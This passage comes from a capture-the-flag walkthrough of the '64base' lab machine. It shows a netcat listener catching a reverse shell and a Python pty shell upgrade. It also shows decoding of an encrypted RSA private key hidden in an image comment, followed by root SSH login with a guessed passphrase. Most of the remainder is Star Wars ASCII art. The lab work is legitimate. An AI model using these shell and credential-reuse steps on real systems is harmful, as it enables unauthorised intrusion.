<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.145.133] from (UNKNOWN) [192.168.145.138] 45307
</span><span class='line'>Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
</span><span class='line'> 18:44:14 up  4:27,  0 users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ python -c 'import pty; pty.spawn("/bin/bash")'      
</span><span class='line'>www-data@64base:/$ </span></code></pre></td></tr></table></div></figure>


<p>I looked around and saw more ASCII art files, then I ran a quick search for the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@64base:/$ find / -name flag* 2&gt;/dev/null
</span><span class='line'>/var/www/html/admin/S3cR37/flag5{TG9vayBJbnNpZGUhIDpECg==}</span></code></pre></td></tr></table></div></figure>


<p>And the hint for the last flag is <code>Look Inside! :D</code>.</p>

<h2>Flag #6 &ndash; Use the force</h2>

<p>Running file on the found file shows that it&rsquo;s a JPEG image:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "4c5330744c5331435255644a546942535530456755464a4a566b4655525342", baseline, precision 8, 960x720, frames 3</span></code></pre></td></tr></table></div></figure>


<p>There is hex in the comment, I decoded it to <code>LS0tLS1CRUdJTiBSU0EgUFJJVkFURSB</code>. Then I passed this through a base64 decoder and it gave me the beginning of an SSH private key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-----BEGIN RSA PRIVATE</span></code></pre></td></tr></table></div></figure>


<p>I needed to take a better look at this, so I downloaded it to my machine:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/flag.jpg" title="flag" alt="flag5"></p>

<p>And then I ran exiftool on it and the comment string was actually huge. So there must be a complete private key in there. So I went again through the hex and bas64 decoding process, to get the key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>Proc-Type: 4,ENCRYPTED
</span><span class='line'>DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C
</span><span class='line'>
</span><span class='line'>mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
</span><span class='line'>YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
</span><span class='line'>8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
</span><span class='line'>kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
</span><span class='line'>MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
</span><span class='line'>k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
</span><span class='line'>wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
</span><span class='line'>guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
</span><span class='line'>TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
</span><span class='line'>2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
</span><span class='line'>AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
</span><span class='line'>4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
</span><span class='line'>+T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
</span><span class='line'>fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
</span><span class='line'>+j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
</span><span class='line'>13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
</span><span class='line'>rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
</span><span class='line'>Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
</span><span class='line'>Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
</span><span class='line'>Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
</span><span class='line'>Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
</span><span class='line'>qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
</span><span class='line'>64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
</span><span class='line'>fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
</span><span class='line'>/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP
</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>


<p>When trying to SSH with the key, I got prompted for a passphrase. I took a swing at it with the message from the image, <em>usetheforce</em>, and it was a win:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.145.138 -p 62964 -i ssh.key
</span><span class='line'>Enter passphrase for key 'ssh.key': 
</span><span class='line'>
</span><span class='line'>Last login: Tue Dec  6 05:40:07 2016 from 172.16.0.18
</span><span class='line'>
</span><span class='line'>flag6{NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK}
</span><span class='line'>root@64base:~# </span></code></pre></td></tr></table></div></figure>


<p>Almost over, because that flag required several decoding cycles before it gave me something usable: <code>base64 -d /var/local/.luke|less.real</code>. With that, I ran it and got the mission success message, which will take a couple of minutes to read:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>     __          __  _ _   _____                      
</span><span class='line'>     \ \        / / | | | |  __ \                     
</span><span class='line'>      \ \  /\  / /__| | | | |  | | ___  _ __   ___    
</span><span class='line'>       \ \/  \/ / _ \ | | | |  | |/ _ \| '_ \ / _ \   
</span><span class='line'>        \  /\  /  __/ | | | |__| | (_) | | | |  __/   
</span><span class='line'>     __  \/ _\/ \___|_|_|_|_____/ \___/|_|_|_|\___| _ 
</span><span class='line'>     \ \   / /          |  __ \(_)   | | |_   _| | | |
</span><span class='line'>      \ \_/ /__  _   _  | |  | |_  __| |   | | | |_| |
</span><span class='line'>       \   / _ \| | | | | |  | | |/ _` |   | | | __| |
</span><span class='line'>        | | (_) | |_| | | |__| | | (_| |  _| |_| |_|_|
</span><span class='line'>        |_|\___/ \__,_| |_____/|_|\__,_| |_____|\__(_)
</span><span class='line'>
</span><span class='line'>_____ _ _ _ __ __ __  _ ___ _   __  ___  __ __  __  _  ___ _ _  __ _________
</span><span class='line'>%=x%= | |V| |_)|_ |_) | |_| |   |_) |_| (_  |_  |_) |  |_| |\| (_  %=x%=x%=x
</span><span class='line'>~~~~~ | | | |  |_ | \ | | | |_  |_) | | __) |_  |   |_ | | | | __) ~~~~~~~~~
</span><span class='line'>LS
</span><span class='line'>             .-. .-.
</span><span class='line'>           .=========.         E x t e r i o r ,   A e r i a l   V i e w
</span><span class='line'>           ||.-.7.-.||         -----------------------------------------
</span><span class='line'>           ||`-' `-'||
</span><span class='line'>           `========='
</span><span class='line'>            `-'| |`-'8               1 .............. Sensor Suite Tower
</span><span class='line'>      ______   |9|   ______          2 ... Heavy Twin Turbolaser Turrets
</span><span class='line'>     /     /\__| |__/\     \         3 ............. Heavy Laser Turrets
</span><span class='line'>    /  \_ / /  |_|  \ \ _/  \        4 ....... TIE Fighter Launch Chutes
</span><span class='line'>   /___(\\\/         \///)___\       5 ............... Heavy Blast Doors
</span><span class='line'>   \____\\`==========='//____/       6 .................... Guard towers
</span><span class='line'>   /     '/ .-------. \\     \       7 ........ Shuttle Landing Platform
</span><span class='line'>__/     //. \`+---+'/ .\\     \__    8 ........... AT-AT Docking Station
</span><span class='line'>   /\ \    ///x`.\|___|/.'x\\\    / /\   9 ................. Connecting Ramp
</span><span class='line'>  /  \ \  //`-._//|   |\\_.2'\\  / /  \
</span><span class='line'> /  _.-==='_____//.-=-.\\_____`===-._  \
</span><span class='line'> \   `-===.\-.  \ `-=1' /  .-/.===-' 3 / The pre-fabricated,  multi-function
</span><span class='line'>  \  / /  \\\ \  \.===./  /4///  \ \  /  Imperial garrison base is the back-
</span><span class='line'>   \/_/    \\\ | /.---.\ | ///    \_\/   bone of the  Empire's  occupational
</span><span class='line'>  \     \\\|/ |_m_| \|///     /      forces. These heavily-armoured for-
</span><span class='line'>   \_____\=============/_____/       tresses have  walls up to 10 meters
</span><span class='line'>   /____///    ___    \\\____\       thick  to  guard   against   ground
</span><span class='line'>   \   (_//\__|||||__/\\_)   /       assaults,  and  powerful  deflector
</span><span class='line'>    \  /  \|,,|||||,,|/  \  /        shields  protect  them  for  air or
</span><span class='line'>     \_____|  | 5 | 6|_____/         space attacks.
</span><span class='line'>           `--'   `--'
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                       U           E x t e r i o r ,   S i d e   V i e w
</span><span class='line'>                      /_\          -------------------------------------
</span><span class='line'>                   1 [___]
</span><span class='line'>                     :`:':           1 .............. Sensor Suite Tower
</span><span class='line'>                     `:::'           2 ... Heavy Twin Turbolaser Turrets
</span><span class='line'>              _       :_:       _    3 ............. Heavy Laser Turrets
</span><span class='line'>            =[ ]2     [%]      [ ]=  4 ....... Tie Fighter Launch Chutes
</span><span class='line'>             :=:      :=:      :=:   5 ............... Heavy Blast Doors
</span><span class='line'>            _|_|_   __| |__   _|_|_  6 .................... Guard Towers
</span><span class='line'>           / /XX|\ /__|_|__\ /|XX\ \
</span><span class='line'>     3    /4/XXX| | _/___\_ | |XXX\ \             7 ....... AT-AT Walker
</span><span class='line'>--===____/--===X|_|/_______\|_|X===--\____===--   8 ........ AT-ST Scout
</span><span class='line'> /__| |     /l_\\             //_|\     |_|__\
</span><span class='line'>/~~.' |    /:'  \\   _____   //  `:\    | `.  \
</span><span class='line'>   /   | .'   / |    \\==|||||==//    | \   `. |   \   7    8
</span><span class='line'>  /   .' |   / .'     |  ||5|| 6|     `. \   | `.   \  xx=   _
</span><span class='line'> /____|__|__/__|______l__|||||__l______|__\__|__|____\ ll   &lt;~
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                                             O u t e r   D e f e n s e s
</span><span class='line'>        |                      |             ---------------------------
</span><span class='line'>     ^_[]_^                 ^_[]_^
</span><span class='line'>     |----|               5 |----|        1 ... High Voltage Death Fence
</span><span class='line'> ________`-..-'________4________`-..-'______  2 ....... Perimeter Gate House
</span><span class='line'> ===========================================  3 ........ Powered Force Field
</span><span class='line'>      `||'                   `||'         4 .......... Fortified Catwalk
</span><span class='line'>       ||     ^==^   ^==^     ||          5 ......... Observattion tower
</span><span class='line'> ___.____._ll_._1_|--|   |--|___._ll_.____.____
</span><span class='line'> XXX|XXXX|XIIX|XXX|--| 3 |--|XXX|XIIX|XXXX|XXXX
</span><span class='line'> XXX|XXXX|XIIX|XXX| 2|   |  |XXX|XIIX|XXXX|XXXX
</span><span class='line'>
</span><span class='line'> The outer perimeter is  marked  by a  high-voltage  "death fence."  Powered
</span><span class='line'> Force fields  placed at regular intervals along the fence may be turned off
</span><span class='line'> to permit entry and exit.  Observation towers,  connected by fortified cat-
</span><span class='line'> walks,  are set back from the fence and constantly manned by stormtroopers.
</span><span class='line'> Other outer  defenses  include energy mine fields,  modified patrol Droids,
</span><span class='line'> and AT-ST Scout Walkers.
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>         _
</span><span class='line'>        /|                               L a n d i n g   P l a t f o r m
</span><span class='line'>      -==+                               -------------------------------
</span><span class='line'>        :
</span><span class='line'>     [__________]               Up to two Lambda-class shuttles and four
</span><span class='line'>     `' ||  ||`-'               AT-AT  Walkers can dock at the platform.
</span><span class='line'>       ========  =xx            A loading  ramp  leads directly from the
</span><span class='line'>        ||  ||    ll            platform into the garrison complex.
</span><span class='line'> ~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                                 I n t e r i o r ,   L e v e l s   1 - 5
</span><span class='line'>                                 ---------------------------------------
</span><span class='line'>
</span><span class='line'>      ______         ______      The first 5 levels of the garrison com-
</span><span class='line'>     / ____ \_______/ ____ \     plex are of identical layout, construc-
</span><span class='line'>    / /    \_________/    \ \    ted  around  a  level-spanning  surface
</span><span class='line'>   / /      |   3   |  5   \ \   vehicle bay.  Refer to the key below to
</span><span class='line'>   \ \       \_____/_______/ /   determine what each level contains.
</span><span class='line'>   / /    o   |o o|   o    \ \
</span><span class='line'>__/ /  2    .' o4o `.    6  \ \__    1 ... Storage Gallery (levels 1-2),
</span><span class='line'>   / __/      .' ._o_o_. `.      \__ \         Armory (levels 3-4), Training
</span><span class='line'>  / /  `-.  .' .'  10   `. `.  .-'  \ \        Facilities   and   Recreation
</span><span class='line'> / /      ~' .'`-._____.-'`. `~      \ \       Rooms (level 5)
</span><span class='line'> \ \     o  &lt;  C  | | |  D  &gt;  o  7  / / 2 ... Stormtrooper Barracks (levels
</span><span class='line'>  \ \__      \    ' ' '    /      __/ /        1-3),    Security    Barracks
</span><span class='line'>   \__ \  1  |----  9  ----|~-._ / __/         (levels 4-5)
</span><span class='line'>  \ \    |====    B====|    Y /      3 ...... Base Security (levels 1-5)
</span><span class='line'>   \ \   |----     ----|   / /       4 ......... Turbolifts (levels 1-6)
</span><span class='line'>   / /   |__A_     _ __| 8 \ \       5 .... Detention Block (levels 1-5)
</span><span class='line'>   \ \      | |   | |      / /       6 ... Technical and Service Person-
</span><span class='line'>    \ \_____| |   | |_____/ /              nel Barracks (levels 1-5)
</span><span class='line'>     \_____ `o|   |o' _____/         7 ... Technical Shops (levels 1-2),
</span><span class='line'>           `--'   `--'                     Medical   Bay    (level   3),
</span><span class='line'>                                           Science Labs (levels 4-5)
</span><span class='line'>            8 ... Storage Gallery (levels 1-2), Droid Shops (levels 3-5)
</span><span class='line'>            9 ...................... Surface Vehicle  Bay  (levels 1-5):
</span><span class='line'>            A .................................. AT-ST Scout Walker Bays
</span><span class='line'>            B ........................................ AT-AT Walker Bays
</span><span class='line'>            C ...................... Vehicle Maintenance and Repair Deck
</span><span class='line'>            D ........................................ Speeder Bike Deck
</span><span class='line'>            10 ........................... Miscellaneous Vehicle Parking
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                                       I n t e r i o r ,   L e v e l   6
</span><span class='line'>                                       ---------------------------------
</span><span class='line'>     ____           ____
</span><span class='line'>    / __ \_________/ __ \        Base command personnel,  control rooms,
</span><span class='line'>   / /  \___________/  \ \       rooms,  trade  mission,  and diplomatic
</span><span class='line'>   \ \ o     oo      o / /       offices are located on this level.
</span><span class='line'>   / /       oo----.   \ \
</span><span class='line'>  / /   8  __oo     `.1 \ \      1 ....... Sensor Monitors, Tractor Beam
</span><span class='line'>   __/ /\    .~  ||   2   \  \ \__                       and Shield Controls
</span><span class='line'>  / __/  \ .' 9.-'`-.      | /\__ \  2 ....................... Computer Room
</span><span class='line'> / /   o  \|__:   o  :_____|/ o  \ \ 3 ....................... Meeting Rooms
</span><span class='line'> \ \__  7 .---: 10   :------.3 __/ / 4 ...... Officers' and Pilots' Quarters
</span><span class='line'>  \__ \  /     `-..-'        \/ __/  5 ... Trade Mission, Diplomatic Offices
</span><span class='line'> \ \/\   5   ||          / /     6 ........... Base Commander's Quarters
</span><span class='line'>  \ \ `.     ||    4    / /                                  and offices
</span><span class='line'>   \ \ o~`---||      o / /       7 ............ Officer Recreation Rooms
</span><span class='line'>   / /6  ____||_____   \ \       8 ............................. Offices
</span><span class='line'>   \ \__/ _________ \__/ /       9 ................... Base Control Room
</span><span class='line'>    \____/         \____/        10 ..................... Reception Area
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                                       I n t e r i o r ,   L e v e l   7
</span><span class='line'>                                       ---------------------------------
</span><span class='line'>    __             __
</span><span class='line'>   /_]\           /[_\        The TIE Fighter  Hanger  Deck  houses  the
</span><span class='line'>   \ \,===========./ /        garrison's TIE fighters in standard-design
</span><span class='line'>   //:o-----------o:\\        ceiling racks.  Bases are usually equipped
</span><span class='line'>  /// X  X X X X  X \\\       with  30 TIE fighters and five TIE bombers
</span><span class='line'> /// X X  X_X_X  X X \\\      (a single  bomber  takes  up the same rack
</span><span class='line'>  __/// X X   [___]   X X \\\__   space as two fighters).  Five  to 15 ships
</span><span class='line'> /\_/o X X  1 &/3\&    X X o\_/\  are on constant  patrol,  depending on the
</span><span class='line'> \]_\\ X X   &lt;\\_//&gt;       //_[/  base's readiness level.
</span><span class='line'>\\\ X X   \&gt;&&lt;/2  X []///
</span><span class='line'> \\\ X X   []    X []///      1 .............. TIE Fighter Ceiling Racks
</span><span class='line'>  \\\ X   [] []     ///                           (holds up to 40 craft)
</span><span class='line'>   \\:o-----------o://        2 ............. Lift Platforms, to Level 8
</span><span class='line'>   /_/`==========='\_\        3 .................. Flight Control Center
</span><span class='line'>   \_]/           \[_/        X ............................ TIE Fighter
</span><span class='line'>                              [] ............................ TIE Bomber
</span><span class='line'>
